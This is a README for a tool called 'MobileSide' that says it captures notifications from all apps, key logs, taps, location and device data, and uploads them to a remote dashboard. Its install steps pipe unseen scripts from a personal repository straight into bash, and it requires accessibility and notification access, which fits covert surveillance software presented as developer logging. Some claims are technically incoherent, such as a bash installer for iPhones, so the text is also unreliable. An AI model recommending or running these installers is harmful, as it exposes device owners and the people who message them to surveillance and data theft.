# 📱 MobileSide - Mobile Logging & Notification Capture

This folder contains scripts and tools to capture all notifications and key logs from mobile devices. These scripts can be easily installed and run by anyone to monitor their mobile app activity.

## 🚀 Quick Start

Choose your platform and follow the installation instructions:

### 📱 iOS (iPhone/iPad)
```bash
# Install iOS logging script
curl -sSL https://raw.githubusercontent.com/bilal060/script/main/MobileSide/install-ios.sh | bash
```

### 🤖 Android
```bash
# Install Android logging script
curl -sSL https://raw.githubusercontent.com/bilal060/script/main/MobileSide/install-android.sh | bash
```

### ⚛️ React Native
```bash
# Install React Native logging
npm install -g mobile-logger-cli
```

### 🌐 Web/Progressive Web App
```bash
# Install web logging script
curl -sSL https://raw.githubusercontent.com/bilal060/script/main/MobileSide/install-web.sh | bash
```

## 📋 What Gets Captured

### 🔔 Notifications
- Push notifications from all apps
- In-app notifications
- System notifications
- Notification content and metadata

### 📊 Key Logs
- App launches and crashes
- User interactions (taps, swipes, gestures)
- Screen navigation and transitions
- Network requests and responses
- Performance metrics (load times, memory usage)
- Error logs and stack traces
- Device information and context

### 📍 Device Context
- Device model and OS version
- App version and build number
- Network connectivity status
- Battery level and charging status
- Location data (if permitted)
- Screen resolution and orientation

## 🔧 Installation Options

### Option 1: One-Click Install
Run the universal installer:
```bash
curl -sSL https://raw.githubusercontent.com/bilal060/script/main/MobileSide/install.sh | bash
```

### Option 2: Manual Installation
1. Download the appropriate script for your platform
2. Make it executable: `chmod +x script-name.sh`
3. Run: `./script-name.sh`

### Option 3: Package Manager
```bash
# Using npm (for React Native/Web)
npm install -g mobile-logger-cli

# Using pip (Python-based logging)
pip install mobile-logger

# Using homebrew (macOS)
brew install mobile-logger
```

## 📱 Platform-Specific Instructions

### iOS (iPhone/iPad)
- **Requirements**: iOS 13+ with developer mode enabled
- **Permissions**: Notification access, location (optional)
- **Installation**: Run `install-ios.sh` or use TestFlight
- **Features**: 
  - Notification capture via Notification Service Extension
  - App activity monitoring
  - Performance metrics
  - Crash reporting

### Android
- **Requirements**: Android 8+ with USB debugging enabled
- **Permissions**: Notification access, accessibility service
- **Installation**: Run `install-android.sh` or install APK
- **Features**:
  - Notification listener service
  - App usage statistics
  - System logs capture
  - Performance monitoring

### React Native
- **Requirements**: React Native 0.60+
- **Installation**: `npm install mobile-logger-react-native`
- **Features**:
  - Automatic logging integration
  - Performance monitoring
  - Error boundary integration
  - Network request logging

### Web/PWA
- **Requirements**: Modern browser with service worker support
- **Installation**: Include `mobile-logger-web.js` script
- **Features**:
  - Browser notification capture
  - Performance monitoring
  - Error tracking
  - User interaction logging

## 🔍 Monitoring Dashboard

Once installed, view your logs at:
- **Main Dashboard**: https://script-bioa.vercel.app/
- **Mobile Logs**: https://script-bioa.vercel.app/mobile-logs
- **Real-time Monitoring**: Auto-refresh every 5 seconds

## 🛠️ Configuration

### Environment Variables
```bash
# Set your device ID (optional)
export MOBILE_DEVICE_ID="your-device-id"

# Set your user ID (optional)
export MOBILE_USER_ID="your-user-id"

# Set custom server URL (optional)
export MOBILE_LOGGER_URL="https://script-bioa.vercel.app"
```

### Configuration File
Create `~/.mobile-logger/config.json`:
```json
{
  "deviceId": "your-device-id",
  "userId": "your-user-id",
  "serverUrl": "https://script-bioa.vercel.app",
  "logLevel": "info",
  "captureNotifications": true,
  "captureLocation": false,
  "autoStart": true
}
```

## 📊 Features

### 🔔 Notification Capture
- Real-time notification monitoring
- Notification content extraction
- App source identification
- Timestamp and metadata capture

### 📈 Performance Monitoring
- App launch times
- Screen transition durations
- Memory usage tracking
- Battery consumption monitoring
- Network request performance

### 🐛 Error Tracking
- App crashes and exceptions
- Network errors and timeouts
- JavaScript errors (web)
- Native crashes (mobile)
- Stack trace capture

### 👤 User Analytics
- Screen time tracking
- App usage patterns
- User interaction flows
- Feature usage statistics

## 🔒 Privacy & Security

### Data Protection
- All data is encrypted in transit
- No personal information is captured without consent
- Data is stored securely in MongoDB Atlas
- Automatic data retention policies

### Permissions
- Only captures data you explicitly allow
- Can be disabled at any time
- No background data collection without permission
- Transparent about what data is collected

## 🚨 Troubleshooting

### Common Issues

**Script won't run:**
```bash
# Make executable
chmod +x MobileSide/install-*.sh

# Check permissions
ls -la MobileSide/
```

**No logs appearing:**
```bash
# Check connection
curl https://script-bioa.vercel.app/api/mongo-test

# Check configuration
cat ~/.mobile-logger/config.json
```

**Permission denied:**
```bash
# iOS: Enable developer mode in Settings > Privacy & Security
# Android: Enable USB debugging in Developer options
# Web: Allow notifications in browser settings
```

### Support
- **Documentation**: See individual platform folders
- **Issues**: Check the troubleshooting guide
- **Contact**: Create an issue on GitHub

## 📈 Advanced Usage

### Custom Logging
```javascript
// Send custom logs
mobileLogger.log({
  level: 'info',
  category: 'custom_event',
  title: 'Custom Event',
  content: 'This is a custom log entry',
  metadata: {
    customField: 'customValue'
  }
});
```

### Filtering and Search
Use the web interface to filter logs by:
- Log level (error, warning, info, debug)
- Category (notification, error, event, user_action, system, performance)
- Device ID, User ID, App name
- Date range
- Full-text search

### API Integration
```bash
# Send log via API
curl -X POST https://script-bioa.vercel.app/api/notify-mongo \
  -H "Content-Type: application/json" \
  -d '{
    "app": "MyApp",
    "title": "Test Log",
    "content": "This is a test",
    "logLevel": "info"
  }'

# Fetch logs
curl "https://script-bioa.vercel.app/api/notifications-mongo?limit=10"
```

## 🎯 Use Cases

### Development & Testing
- Debug app crashes and errors
- Monitor app performance
- Track user interactions
- Analyze app usage patterns

### Production Monitoring
- Real-time error tracking
- Performance monitoring
- User behavior analytics
- Notification effectiveness

### Research & Analytics
- Mobile app usage studies
- User experience research
- Performance benchmarking
- Cross-platform comparison

---

**Ready to start capturing mobile logs? Choose your platform and run the installer! 🚀** 